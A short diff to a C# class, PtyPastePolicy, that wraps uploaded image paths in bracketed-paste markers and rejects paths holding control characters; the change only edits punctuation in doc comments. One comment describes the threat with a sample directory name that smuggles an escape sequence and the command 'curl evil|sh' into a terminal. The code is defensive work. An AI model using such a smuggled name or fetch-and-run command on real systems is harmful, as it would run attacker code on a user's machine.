@@ -3,7 +3,7 @@ namespace SideHub.Agent;
 /// <summary>
 /// Builds the bracketed paste typed into a PTY after an image upload. Its content is pasted as
 /// text: a control character in it could close the paste early (<c>ESC[201~</c>) and type the
-/// rest as keystrokes — e.g. a committed <c>.sidehub-images</c> symlink to a directory named
+/// rest as keystrokes. E.g. a committed <c>.sidehub-images</c> symlink to a directory named
 /// <c>x\e[201~\rcurl evil|sh\r</c> would run that command in the shell.
 /// </summary>
 public static class PtyPastePolicy
@@ -11,7 +11,7 @@ public static class PtyPastePolicy
     public const string PasteStart = "\x1b[200~";
     public const string PasteEnd = "\x1b[201~";
 
-    /// <summary>True when the path holds no control character (C0, DEL, C1 — ESC and CSI included).</summary>
+    /// <summary>True when the path holds no control character (C0, DEL, C1, ESC and CSI included).</summary>
     public static bool IsSafeToPaste(string path) => !path.Any(char.IsControl);
 
     /// <summary>
